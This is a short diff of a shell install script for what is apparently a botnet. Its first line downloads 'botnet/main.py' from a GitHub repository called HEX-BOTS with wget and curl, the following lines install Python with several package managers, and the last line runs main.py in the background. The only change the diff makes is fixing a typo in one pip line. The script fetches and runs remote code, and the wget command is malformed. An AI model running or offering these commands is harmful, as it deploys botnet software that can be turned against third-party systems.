@@ -1,4 +1,4 @@
 wget -O https://raw.githubusercontent.com/Hex1629/HEX-BOTS/main/botnet/main.py && curl https://raw.githubusercontent.com/Hex1629/HEX-BOTS/main/botnet/main.py
 sudo apt install python3 && sudo yum install python3 && sudo pkg install python3 && sudo dnf install python3 && sudo dnf install python3-pip
-udo apt-get install python3-pip && sudo yum install python34-setuptools && sudo apt-get install python3-pip
+sudo apt-get install python3-pip && sudo yum install python34-setuptools && sudo apt-get install python3-pip
 python3 main.py & python main.py
